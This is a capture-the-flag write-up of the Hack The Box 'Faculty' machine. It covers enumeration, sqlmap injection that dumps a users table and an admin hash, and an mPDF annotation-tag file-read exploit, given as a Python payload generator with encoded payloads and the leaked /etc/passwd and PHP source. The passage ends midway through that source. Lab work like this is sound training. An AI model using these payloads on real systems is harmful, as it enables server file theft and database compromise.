![faculty.png](faculty.png)

# Faculty

## enum
```bash
nmap -sC -sV faculty.htb -oN nmap.initial  130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-16 09:17 IST
Nmap scan report for faculty.htb (10.10.11.169)
Host is up (0.045s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-title: School Faculty Scheduling System
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.53 seconds
zsh: segmentation fault  nmap -sC -sV faculty.htb -oN nmap.initial
```

```bash
dirsearch -u http://faculty.htb/           130 ⨯

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/blnkn/.dirsearch/reports/faculty.htb/-_22-10-16_09-14-49.txt

Error Log: /home/blnkn/.dirsearch/logs/errors-22-10-16_09-14-49.log

Target: http://faculty.htb/

[09:14:49] Starting:
[09:14:54] 301 -  178B  - /admin  ->  http://faculty.htb/admin/
[09:14:55] 302 -   14KB - /admin/  ->  login.php
[09:14:55] 302 -   14KB - /admin/?/login  ->  login.php
[09:14:55] 200 -   17B  - /admin/download.php
[09:14:55] 200 -    3KB - /admin/home.php
[09:14:55] 200 -    5KB - /admin/login.php
[09:14:55] 302 -   14KB - /admin/index.php  ->  login.php
[09:15:02] 200 -    3KB - /header.php
[09:15:02] 302 -   12KB - /index.php  ->  login.php
[09:15:04] 200 -    5KB - /login.php
[09:15:10] 500 -    0B  - /test.php

Task Completed
```

## Login bypass
The main login page just asks for a Faculty ID number, that may be vulerable to a simple IDOR.  
But there's a separate page on /admin/login.php, this one has a basic login bypass.     

## Enum as admin
Now that we are admin on the site, we can start enumarating again.  
```
Cookie: PHPSESSID=o7987bp4js9jm58hh523hm2i9n
```

The faculty list page gives us all the existing faculty ID and lets us create new ones, so no need to atempt the IDOR anymore. 
![users.png](users.png)

There are 5 pages with the following forms : 
```
- course list   - new course form  - ?action=save_course   - POST - multipart/form-data
- subject list  - new subject form - ?action=save_subject  - POST - multipart/form-data 
- faculty list  - new fac id       - ?action=save_faculty  - POST - application/x-www-form-urlencoded 
- schedule      - new sched entry  - ?action=save_schedule - POST - multipart/form-data 
- users         - the new user button is useless afaict
```

## SQLi

testing them all for sqli, starting with the only urlencoded one, and it's already a win.  
```http
POST /admin/ajax.php?action=save_faculty HTTP/1.1
Host: faculty.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 107
Origin: http://faculty.htb
Connection: close
Referer: http://faculty.htb/admin/index.php?page=faculty
Cookie: PHPSESSID=o7987bp4js9jm58hh523hm2i9n

id=&id_no=asdf&lastname=asdfa&firstname=asdf&middlename=asdf&email=sdfa&contact=asdf&gender=Male&address=sd
```

Then SQLi to leak a bunch of things from the db, it is possible to get the administrator's hash but I didn't succeed in cracking it though  
```bash
sqlmap -r save_faculty.req --batch --threads 10 --users
sqlmap -r save_faculty.req --batch --threads 10 --dbs
sqlmap -r save_faculty.req --batch --threads 10 -D scheduling_db --tables
sqlmap -r save_faculty.req --batch --threads 10 -D scheduling_db -T users --dump
+----+---------------+------+----------------------------------+----------+
| id | name          | type | password                         | username |
+----+---------------+------+----------------------------------+----------+
| 1  | Administrator | 1    | 1fecbe762af147c1176a0fc2c722a345 | admin    |
+----+---------------+------+----------------------------------+----------+
```

I'm still curious to see if the multipart/form-data ones are also injectable   
```bash
cat save_course.req
POST /admin/ajax.php?action=save_course HTTP/1.1
Host: faculty.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------365414256232201372978481193
Content-Length: 396
Origin: http://faculty.htb
Connection: close
Referer: http://faculty.htb/admin/index.php?page=courses
Cookie: PHPSESSID=o7987bp4js9jm58hh523hm2i9n

-----------------------------365414256232201372978481193
Content-Disposition: form-data; name="id"


-----------------------------365414256232201372978481193
Content-Disposition: form-data; name="course"

asdf
-----------------------------365414256232201372978481193
Content-Disposition: form-data; name="description"

asdf
-----------------------------365414256232201372978481193--
```
```bash
sqlmap -r save_course.req --batch --threads 10 --dbms mysql --risk 3 --level 5
```
looks like it isn't, at leaast for this `save_course` one, lets move on anyways. 


## Exploring potential exploits for mPDF

As admin some of the pages also have a button to generate pdfs on the fly, when you hit the button it sends a b64 encoded payload of whatever data is on the page. 

That data is processed by mPDF on the serverside, and we receive back a 200 OK with the name of the generated pdf in the body, then the client side goes to `/mdpf/tmp/<name>.pdf`   

Doing some basic forensics on the pdfs, it looks like they're generated with mPDF version 6.0.  
```bash
file OK3aeYPblHAfzdXUq216o9BTMn.pdf
OK3aeYPblHAfzdXUq216o9BTMn.pdf: PDF document, version 1.4, 1 pages

exiftool OK3aeYPblHAfzdXUq216o9BTMn.pdf
ExifTool Version Number         : 12.44
File Name                       : OK3aeYPblHAfzdXUq216o9BTMn.pdf
Directory                       : .
File Size                       : 1750 bytes
File Modification Date/Time     : 2022:10:16 10:22:00+01:00
File Access Date/Time           : 2022:10:16 10:22:10+01:00
File Inode Change Date/Time     : 2022:10:16 10:22:00+01:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Page Layout                     : OneColumn
Producer                        : mPDF 6.0
Create Date                     : 2022:10:16 10:20:27+01:00
Modify Date                     : 2022:10:16 10:20:27+01:00
```

looking at searchsploit there seems to be only one relevant exploit: 
```bash
mPDF
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
dompdf 0.6.0 - 'dompdf.php?read' Arbitrary File Read                   | php/webapps/33004.txt
dompdf 0.6.0 beta1 - Remote File Inclusion                             | php/webapps/14851.txt
mPDF 5.3 - File Disclosure                                             | php/webapps/18248.pl
mPDF 7.0 - Local File Inclusion                                        | php/webapps/50995.py
SlimPDF Reader - Denial of Service (PoC)                               | windows/dos/17274.txt
Slimpdf Reader 1.0 - Memory Corruption                                 | windows/dos/19391.py
TYPO3 Extension ke DomPDF - Remote Code Execution                      | php/webapps/35443.txt
----------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Trying that LFI script: 
```bash
searchsploit -m php/webapps/50995.py
mv 50995.py lfi.py
```
```python
# Exploit Title: mPDF 7.0 - Local File Inclusion
# Google Dork: N/A
# Date: 2022-07-23
# Exploit Author: Musyoka Ian
# Vendor Homepage: https://mpdf.github.io/
# Software Link: https://mpdf.github.io/
# Version: CuteNews
# Tested on: Ubuntu 20.04, mPDF 7.0.x
# CVE: N/A

#!/usr/bin/env python3

from urllib.parse import quote
from cmd import Cmd
from base64 import b64encode

class Terminal(Cmd):
    prompt = "\nFile >> "
    def default(self, args):
        payload_gen(args)
def banner():
    banner = """                          _____  _____  ______   ______ ___  __   __                  _       _ _
                         |  __ \|  __ \|  ____| |____  / _ \ \ \ / /                 | |     (_) |
               _ __ ___  | |__) | |  | | |__        / / | | | \ V /    _____  ___ __ | | ___  _| |_
               | '_ ` _ \|  ___/| |  | |  __|      / /| | | |  > <    / _ \ \/ / '_ \| |/ _ \| | __|
               | | | | | | |    | |__| | |        / / | |_| | / . \  |  __/>  <| |_) | | (_) | | |_
               |_| |_| |_|_|    |_____/|_|       /_/ (_)___(_)_/ \_\  \___/_/\_\ .__/|_|\___/|_|\__|
                                                                               | |
                                                                               |_|   """
    print(banner)
def payload_gen(fname):
    payload = f'<annotation file="{fname}" content="{fname}" icon="Graph" title="Attached File: {fname}" pos-x="195" />'
    encoded_payload = quote(payload)
    print("[+] Replace the content with the payload below")

    print(f"Url encoded payload:\n{encoded_payload}\n")
    base64enc = b64encode(encoded_payload.encode())
    print(f"Base64 encoded payload:\n{base64enc.decode()}\n")
if __name__ == ("__main__"):
    banner()
    print("Enter Filename eg. /etc/passwd")
    terminal= Terminal()
    terminal.cmdloop()
```
this seemed promissing as it's generating b64 payloads to send to mPDF, trying to replace the payload in burp and see if that returns anything interesting, it returns an empty pdf.  

I tried to look at it with strings, but I don't think the files are actually beeing included in it. 

Googling further, I found a buch more things, and tried a bunch of CVEs below, they should all be ongoing as they've all been patched way after 6.0.   
```
CVE-2019-1000005 - https://github.com/mpdf/mpdf/issues/949   - PHP deserialization through phar:// wrapper
CVE-2011-5219    - https://www.exploit-db.com/exploits/18248 - File Disclosure perl script 
CVE-2018-19047   - https://github.com/mpdf/mpdf/issues/867   - SSRF - vulnerable
No CVE           - https://github.com/mpdf/mpdf/issues/356   - annotation tags
```

I managed to make the SSRF work, but not sure what to use it against.  

Looking into the deserialization, looks like the phar/jpeg needs to be hosted localy anyways, and we haven't got that option yet.   

That annotation tag thing was super hard to find, but it works, let look at it closer

## Circling back to the mPDF LFI

So according to this github issue: [https://github.com/mpdf/mpdf/issues/356](https://github.com/mpdf/mpdf/issues/356)  

We could abuse the html tags to have mPDF include system files in the pdf, like this: 
```html
<annotation file="/etc/passwd" content="/etc/passwd"  icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```

Which means that we would we need to inject that in the payload somehow, so lets try to get it decoded furthter.

Probing around with cyberchef we can see that it's urlencoded twice, and then base64 on top  
![cyber-chef.png](cyber-chef.png)

So we get something like that
```html
<h1><a name="top"></a>faculty.htb</h1><h2>Subjects</h2><table>    <thead>        <tr>            <th class="text-center">#</th>            <th class="text-left">Subject</th>            <th class="text-left">Description</th>            </tr></thead><tbody><tr><td class="text-center">1</td><td class="text-center"><b>DBMS</b></td><td class="text-center"><small><b>Database Management System</b></small></td></tr><tr><td class="text-center">2</td><td class="text-center"><b>Mathematics</b></td><td class="text-center"><small><b>Mathematics</b></small></td></tr><tr><td class="text-center">3</td><td class="text-center"><b>English</b></td><td class="text-center"><small><b>English</b></small></td></tr><tr><td class="text-center">4</td><td class="text-center"><b>Computer Hardware</b></td><td class="text-center"><small><b>Computer Hardware</b></small></td></tr><tr><td class="text-center">5</td><td class="text-center"><b>History</b></td><td class="text-center"><small><b>History</b></small></td></tr></tboby></table>
```

formated in a more readable fashion
```html
<h1><a name="top"></a>faculty.htb</h1>
<h2>Subjects</h2>
<table>    
	<thead>        
		<tr> 
			<th class="text-center">#</th> 
			<th class="text-left">Subject</th> 
			<th class="text-left">Description</th> 
		</tr>
	</thead>
	<tbody>
		<tr>
			<td class="text-center">1</td>
			<td class="text-center"><b>DBMS</b></td>
			<td class="text-center"><small><b>Database Management System</b></small></td>
		</tr>
		<tr>
			<td class="text-center">2</td>
			<td class="text-center"><b>Mathematics</b></td>
			<td class="text-center"><small><b>Mathematics</b></small></td>
		</tr>
		<tr>
			<td class="text-center">3</td>
			<td class="text-center"><b>English</b></td>
			<td class="text-center"><small><b>English</b></small></td></tr>
		<tr>
			<td class="text-center">4</td>
			<td class="text-center"><b>Computer Hardware</b></td>
			<td class="text-center"><small><b>Computer Hardware</b></small></td>
		</tr>
		<tr>
			<td class="text-center">5</td>
			<td class="text-center"><b>History</b></td>
			<td class="text-center"><small><b>History</b></small></td>
		</tr>
	</tboby>
</table>
```

But do we care? Probably not, lets try to swap that with what we want: 
```html
<annotation file="/etc/passwd" content="/etc/passwd"  icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```

![cyber-chef-encode.png](cyber-chef-encode.png)  

```
JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlPSUyNTIyL2V0Yy9wYXNzd2QlMjUyMiUyNTIwY29udGVudD0lMjUyMi9ldGMvcGFzc3dkJTI1MjIlMjUyMCUyNTIwaWNvbj0lMjUyMkdyYXBoJTI1MjIlMjUyMHRpdGxlPSUyNTIyQXR0YWNoZWQlMjUyMEZpbGU6JTI1MjAvZXRjL3Bhc3N3ZCUyNTIyJTI1MjBwb3MteD0lMjUyMjE5NSUyNTIyJTI1MjAvJTI1M0U=
```

and as expected we have an annotation file showing up as this graph icon   
![graph.png](graph.png)   

```
root:x:1:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
postfix:x:113:119::/var/spool/postfix:/usr/sbin/nologin
developer:x:1001:1002:,,,:/home/developer:/bin/bash
usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

```bash
grep sh$ passwd
root:x:1:0:root:/root:/bin/bash
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
developer:x:1001:1002:,,,:/home/developer:/bin/bash
```

So is the very first thing we tried actually, that script would've worked if the backend did one urldecode and one base64 decode, but as we saw before the owner of the box makes it do a second urlencode /decode to throw us off, (and it worked).  
So this simple change on the script would've generated a working payload:  
```bash
diff old-lfi.py lfi.py
33c33
<     encoded_payload = quote(payload)
---
>     encoded_payload = quote(quote(payload))
```

Let's use a slightly modified version of that now:  
```python
import sys
from urllib.parse import quote
from cmd import Cmd
from base64 import b64encode


def banner():
    banner = """                          _____  _____  ______   ______ ___  __   __                  _       _ _
                         |  __ \|  __ \|  ____| |____  / _ \ \ \ / /                 | |     (_) |
               _ __ ___  | |__) | |  | | |__        / / | | | \ V /    _____  ___ __ | | ___  _| |_
               | '_ ` _ \|  ___/| |  | |  __|      / /| | | |  > <    / _ \ \/ / '_ \| |/ _ \| | __|
               | | | | | | |    | |__| | |        / / | |_| | / . \  |  __/>  <| |_) | | (_) | | |_
             |_| |_| |_|_|    |_____/|_|       /_/ (_)___(_)_/ \_\  \___/_/\_\ .__/|_|\___/|_|\__|
                                                                               | |
                                                                               |_|   """
    print(banner)

def payload_gen(fname):
    payload = f'<annotation file="{fname}" content="{fname}" icon="Graph" title="Attached File: {fname}" pos-x="195" />'
    encoded_payload = quote(quote(payload))
    print("[+] Replace the content with the payload below")

    print(f"Double url encoded payload:\n{encoded_payload}\n")
    base64enc = b64encode(encoded_payload.encode())
    print(f"Base64 encoded payload:\n{base64enc.decode()}\n")

if __name__ == ("__main__"):
    banner()
    payload_gen(sys.argv[1])
```
Sending invalid queries in burp earlier an error leaked a source file path to us:  
```
curl "http://faculty.htb/admin/ajax.php?action=save_course"
```

So we can start by leaking that with the mPDF annotation LFI
```bash
python3 lfi.py /var/www/scheduling/admin/admin_class.php
                          _____  _____  ______   ______ ___  __   __                  _       _ _
                         |  __ \|  __ \|  ____| |____  / _ \ \ \ / /                 | |     (_) |
               _ __ ___  | |__) | |  | | |__        / / | | | \ V /    _____  ___ __ | | ___  _| |_
               | '_ ` _ \|  ___/| |  | |  __|      / /| | | |  > <    / _ \ \/ / '_ \| |/ _ \| | __|
               | | | | | | |    | |__| | |        / / | |_| | / . \  |  __/>  <| |_) | | (_) | | |_
               |_| |_| |_|_|    |_____/|_|       /_/ (_)___(_)_/ \_\  \___/_/\_\ .__/|_|\___/|_|\__|
                                                                               | |
                                                                               |_|
[+] Replace the content with the payload below
Double url encoded payload:
%253Cannotation%2520file%253D%2522/var/www/scheduling/admin/admin_class.php%2522%2520content%253D%2522/var/www/scheduling/admin/admin_class.php%2522%2520icon%253D%2522Graph%2522%2520title%253D%2522Attached%2520File%253A%2520/var/www/scheduling/admin/admin_class.php%2522%2520pos-x%253D%2522195%2522%2520/%253E

Base64 encoded payload:
JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlJTI1M0QlMjUyMi92YXIvd3d3L3NjaGVkdWxpbmcvYWRtaW4vYWRtaW5fY2xhc3MucGhwJTI1MjIlMjUyMGNvbnRlbnQlMjUzRCUyNTIyL3Zhci93d3cvc2NoZWR1bGluZy9hZG1pbi9hZG1pbl9jbGFzcy5waHAlMjUyMiUyNTIwaWNvbiUyNTNEJTI1MjJHcmFwaCUyNTIyJTI1MjB0aXRsZSUyNTNEJTI1MjJBdHRhY2hlZCUyNTIwRmlsZSUyNTNBJTI1MjAvdmFyL3d3dy9zY2hlZHVsaW5nL2FkbWluL2FkbWluX2NsYXNzLnBocCUyNTIyJTI1MjBwb3MteCUyNTNEJTI1MjIxOTUlMjUyMiUyNTIwLyUyNTNF
```

```php
<?php
session_start();
ini_set('display_errors', 1);
Class Action {
        private $db;

        public function __construct() {
                ob_start();
        include 'db_connect.php';

    $this->db = $conn;
        }
        function __destruct() {
            $this->db->close();
            ob_end_flush();
        }

        function login(){

                        extract($_POST);
                        $qry = $this->db->query("SELECT * FROM users where username = '".$username."' and password = '".md5($password)."' ");
                        if($qry->num_rows > 0){
                                foreach ($qry->fetch_array() as $key => $value) {
                                        if($key != 'password' && !is_numeric($key))
                                                $_SESSION['login_'.$key] = $value;
                                }
                                if($_SESSION['login_type'] != 1){
                                        foreach ($_SESSION as $key => $value) {
                                                unset($_SESSION[$key]);
                                        }
                                        return 2 ;
                                        exit;
                                }
                                        return 1;
                        }else{
                                return 3;
                        }
        }
        function login_faculty(){

                extract($_POST);
                $qry = $this->db->query("SELECT *,concat(lastname,', ',firstname,' ',middlename) as name FROM faculty where id_no = '".$id_no."' ");
                if($qry->num_rows > 0){
                        foreach ($qry->fetch_array() as $key => $value) {
                                if($key != 'password' && !is_numeric($key))
                                        $_SESSION['login_'.$key] = $value;
                        }
                        return 1;
                }else{
                        return 3;
                }
}
        function login2(){

                        extract($_POST);
                        if(isset($email))
                                $username = $email;
                $qry = $this->db->query("SELECT * FROM users where username = '".$username."' and password = '".md5($password)."' ");
                if($qry->num_rows > 0){
                        foreach ($qry->fetch_array() as $key => $value) {
                                if($key != 'passwors' && !is_numeric($key))
                                        $_SESSION['login_'.$key] = $value;
                        }
                        if($_SESSION['login_alumnus_id'] > 0){
                                $bio = $this->db->query("SELECT * FROM alumnus_bio where id = ".$_SESSION['login_alumnus_id']);
                                if($bio->num_rows > 0){
                                        foreach ($bio->fetch_array() as $key => $value) {
                                                if($key != 'passwors' && !is_numeric($key))
                                                        $_SESSION['bio'][$key] = $value;
                                        }
                                }
                        }
                        if($_SESSION['bio']['status'] != 1){
                                        foreach ($_SESSION as $key => $value) {
                                                unset($_SESSION[$key]);
                                        }
                                        return 2 ;
                                        exit;
                                }
                                return 1;
                }else{
                        return 3;
                }
        }
        function logout(){
                session_destroy();
                foreach ($_SESSION as $key => $value) {
                        unset($_SESSION[$key]);
                }
                header("location:login.php");
        }
        function logout2(){
                session_destroy();
                foreach ($_SESSION as $key => $value) {
                        unset($_SESSION[$key]);
                }
                header("location:../index.php");
        }

        function save_user(){
                extract($_POST);
                $data = " name = '$name' ";
                $data .= ", username = '$username' ";
                if(!empty($password))
                $data .= ", password = '".md5($password)."' ";
                $data .= ", type = '$type' ";
                if($type == 1)
                        $establishment_id = 0;
                $data .= ", establishment_id = '$establishment_id' ";
                $chk = $this->db->query("Select * from users where username = '$username';")->num_rows;
                if($chk > 0){
                        return 2;
                        exit;
                }
                if(empty($id)){
                        $save = $this->db->query("INSERT INTO users set ".$data);
                }else{
                        $save = $this->db->query("UPDATE users set ".$data." where id = ".$id);
                }
                if($save){
                        return 1;
                }
        }
        function delete_user(){
                extract($_POST);
                $delete = $this->db->query("DELETE FROM users where id = ".$id);
                if($delete)
                        return 1;
        }
        function signup(){
                extract($_POST);
                $data = " name = '".$firstname.' '.$lastname."' ";
                $data .= ", username = '$email' ";
                $data .= ", password = '".md5($password)."' ";
                $chk = $this->db->query("SELECT * FROM users where username = '$email' ")->num_rows;
                if($chk > 0){
                        return 2;
                        exit;
                }
                        $save = $this->db->query("INSERT INTO users set ".$data);
                if($save){
                        $uid = $this->db->insert_id;
                        $data = '';
                        foreach($_POST as $k => $v){
                                if($k =='password')
                                        continue;
                                if(empty($data) && !is_numeric($k) )
                                        $data = " $k = '$v' ";
                                else
                                        $data .= ", $k = '$v' ";
                        }
                        if($_FILES['img']['tmp_name'] != ''){
                                                        $fname = strtotime(date('y-m-d H:i')).'_'.$_FILES['img']['name'];
                                                        $move = move_uploaded_file($_FILES['img']['tmp_name'],'assets/uploads/'. $fname);
                                                        $data .= ", avatar = '$fname' ";

                        }
                        $save_alumni = $this->db->query("INSERT INTO alumnus_bio set $data ");
                        if($data){
                                $aid = $this->db->insert_id;
                                $this->db->query("UPDATE users set alumnus_id = $aid where id = $uid ");
                                $login = $this->login2();
                                if($login)
                                return 1;
                        }
                }
        }
        function update_account(){
                extract($_POST);
                $data = " name = '".$firstname.' '.$lastname."' ";
                $data .= ", username = '$email' ";
                if(!empty($password))
                $data .= ", password = '".md5($password)."' ";
                $chk = $this->db->query("SELECT * FROM users where username = '$email' and id != '{$_SESSION['login_id']}' ")->num_rows;
                if($chk > 0){
                        return 2;
                        exit;
                }
                        $save = $this->db->query("UPDATE users set $data where id = '{$_SESSION['login_id']}' ");
                if($save){
                        $data = '';
                        foreach($_POST as $k => $v){
                                if($k =='password')
                                        continue;
                                if(empty($data) && !is_numeric($k) )
                                        $data = " $k = '$v' ";
                                else
                                        $data .= ", $k = '$v' ";
                        }
                        if($_FILES['img']['tmp_name'] != ''){
                                                        $fname = strtotime(date('y-m-d H:i')).'_'.$_FILES['img']['name'];
                                                        $move = move_uploaded_file($_FILES['img']['tmp_name'],'assets/uploads/'. $fname);
                                                        $data .= ", avatar = '$fname' ";

                        }
                        $save_alumni = $this->db->query("UPDATE alumnus_bio set $data where id = '{$_SESSION['bio']['id']}' ");
                        if($data){
                                foreach ($_SESSION as $key => $value) {
                                        unset($_SESSION[$key]);
                                }
                                $login = $this->login2();
                                if($login)
                                return 1;
                        }
                }
        }

        function save_settings(){
                extract($_POST);
                $data = " name = '".str_replace("'","&#x2019;",$name)."' ";
                $data .= ", email = '$email' ";
                $data .= ", contact = '$contact' ";
                $data .= ", about_content = '".htmlentities(str_replace("'","&#x2019;",$about))."' ";
                if($_FILES['img']['tmp_name'] != ''){
                                                $fname = strtotime(date('y-m-d H:i')).'_'.$_FILES['img']['name'];
                                                $move = move_uploaded_file($_FILES['img']['tmp_name'],'assets/uploads/'. $fname);
                                        $data .= ", cover_img = '$fname' ";

                }

                // echo "INSERT INTO system_settings set ".$data;
                $chk = $this->db->query("SELECT * FROM system_settings");
                if($chk->num_rows > 0){
                        $save = $this->db->query("UPDATE system_settings set ".$data);
                }else{
                        $save = $this->db->query("INSERT INTO system_settings set ".$data);
                }
                if($save){
                $query = $this->db->query("SELECT * FROM system_settings limit 1")->fetch_array();
                foreach ($query as $key => $value) {
                        if(!is_numeric($key))
                                $_SESSION['settings'][$key] = $value;
                }

                        return 1;
                                }
        }


        function save_course(){
                extract($_POST);
                $data = " course = '$course' ";
                $data .= ", description = '$description' ";
                        if(empty($id)){
                                $save = $this->db->query("INSERT INTO courses set $data");
                        }else{
                                $save = $this->db->query("UPDATE courses set $data where id = $id");
                        }
                if($save)
                        return 1;
        }
        function delete_course(){
                extract($_POST);
                $delete = $this->db->query("DELETE FROM courses where id = ".$id);
                if($delete){
                        return 1;
                }
        }
        function save_subject(){
                extract($_POST);
                $data = " subject = '$subject' ";
                $data .= ", description = '$description' ";
                        if(empty($id)){
                                $save = $this->db->query("INSERT INTO subjects set $data");
                        }else{
                                $save = $this->db->query("UPDATE subjects set $data where id = $id");
                        }
                if($save)
                        return 1;
        }
        function delete_subject(){
                extract($_POST);
                $delete = $this->db->query("DELETE FROM subjects where id = ".$id);
                if($delete){
                        return 1;
                }
        }
        function save_faculty(){
                extract($_POST);
                $data = '';
                foreach($_POST as $k=> $v){
                        if(!empty($v)){
                                if($k !='id'){
                                        if(empty($data))
                                        $data .= " $k='{$v}' ";
                                        else
                                        $data .= ", $k='{$v}' ";
                                }
                        }
                }
                        if(empty($id_no)){
                                $i = 1;
                                while($i == 1){
                                        $rand = mt_rand(1,99999999);
                                        $rand =sprintf("%'08d",$rand);
                                        $chk = $this->db->query("SELECT * FROM faculty where id_no = '$rand' ")->num_rows;
                                        if($chk <= 0){
                                                $data .= ", id_no='$rand' ";
                                                $i = 0;
                                        }
                                }
                        }

                if(empty($id)){
                        if(!empty($id_no)){
                                $chk = $this->db->query("SELECT * FROM faculty where id_no = '$id_no' ")->num_rows;
                                if($chk > 0){
                                        return 2;
                                        exit;
                                }
                        }
                        $save = $this->db->query("INSERT INTO faculty set $data ");
                }else{
                        if(!empty($id_no)){
                                $chk = $this->db->query("SELECT * FROM faculty where id_no = '$id_no' and id != $id ")->num_rows;
                                if($chk > 0){
                                        return 2;
                                        exit;
                                }
                        }
                        $save = $this->db->query("UPDATE faculty set $data where id=".$id);
                }
                if($save)
                        return 1;
        }
        function delete_faculty(){
                extract($_POST);
                $delete = $this->db->query("DELETE FROM faculty where id = ".$id);
                if($delete){
                        return 1;
                }
        }
        function save_schedule(){
                extract($_POST);
                $data = " faculty_id = '$faculty_id' ";
                $data .= ", title = '$title' ";
                $data .= ", schedule_type = '$schedule_type' ";
                $data .= ", description = '$description' ";
                $data .= ", location = '$location' ";
                if(isset($is_repeating)){
                        $data .= ", is_repeating = '$is_repeating' ";
                        $rdata = array('dow'=>implode(',', $dow),'start'=>$month_from.'-01','end'=>(date('Y-m-d',strtotime($month_to .'-01 +1 month - 1 day '))));
                        $data .= ", repeating_data = '".json_encode($rdata)."' ";
                }else{
                        $data .= ", is_repeating = 0 ";
                        $data .= ", schedule_date = '$schedule_date' ";
                }
                $data .= ", time_from = '$time_from' ";
                $data .= ", time_to = '$time_to' ";

                if(empty($id)){
                        $save = $this->db->query("INSERT INTO schedules set ".$data);
                }else{
                        $save = $this->db->query("UPDATE schedules set ".$data." where id=".$id);
                }
                if($save)
                        return 1;
        }
        function delete_schedule(){
                extract($_POST);
                $delete = $this->db->query("DELETE FROM schedules where id = ".$id);
                if($delete){
                        return 1;
                }
        }
        function get_schecdule(){
                extract($_POST);
                $data = array();
                $qry = $this->db->query("SELECT * FROM schedules where faculty_id = 0 or faculty_id = $faculty_id");
                while($row=$qry->fetch_assoc()){
                        if($row['is_repeating'] == 1){
                                $rdata = json_decode($row['repeating_data']);
                                foreach($rdata as $k =>$v){
                                        $row[$k] = $v;
                                }
                        }
                        $data[] = $row;
                }
                        return json_encode($data);
        }
        function delete_forum(){
                extract($_POST);
                $delete = $this->db->query("DELETE FROM forum_topics where id = ".$id);
                if($delete){
                        return 1;
                }
        }
        function save_comment(){
                extract($_POST);
                $data = " comment = '".htmlentities(str_replace("'","&#x2019;",$comment))."' ";

                if(empty($id)){
                        $data .= ", topic_id = '$topic_id' ";
                        $data .= ", user_id = '{$_SESSION['login_id']}' ";
                        $save = $this->db->query("INSERT INTO forum_comments set ".$data);
                }else{
                        $save = $this->db->query("UPDATE forum_comments set ".$data." where id=".$id);
                }
                if($save)
                        return 1;
        }
        function delete_comment(){
                extract($_POST);
